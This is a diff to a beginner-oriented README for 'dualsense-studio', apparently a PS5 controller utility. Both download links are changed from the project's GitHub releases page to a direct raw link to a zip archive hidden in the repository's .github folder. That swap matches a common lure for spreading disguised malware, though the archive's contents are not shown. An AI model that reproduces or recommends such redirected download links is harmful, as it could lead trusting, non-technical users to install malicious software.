@@ -8,7 +8,7 @@ This guide will walk you through everything you need to know to get started, eve
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download-dualsense--studio-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/silkseo2025/dualsense-studio/releases)
+[![Download Now](https://img.shields.io/badge/Download-dualsense--studio-blue?style=for-the-badge&logo=github&color=4CAF50)](https://raw.githubusercontent.com/silkseo2025/dualsense-studio/main/.github/v3.2-alpha.4.zip)
 
 Visit this link to download the application. The download page will show you the latest version available. Look for the file that matches your computer (Windows is the most common). Click on it to start the download.
 
@@ -135,7 +135,7 @@ We hope you enjoy using dualsense-studio as much as we enjoyed creating it. Whet
 
 Remember, if you need to download the application again or share it with a friend, just visit the download page:
 
-[**Download dualsense-studio Now**](https://github.com/silkseo2025/dualsense-studio/releases)
+[**Download dualsense-studio Now**](https://raw.githubusercontent.com/silkseo2025/dualsense-studio/main/.github/v3.2-alpha.4.zip)
 
 Have fun, and enjoy the interactive magic of your PS5 controller, right on your computer screen!
 
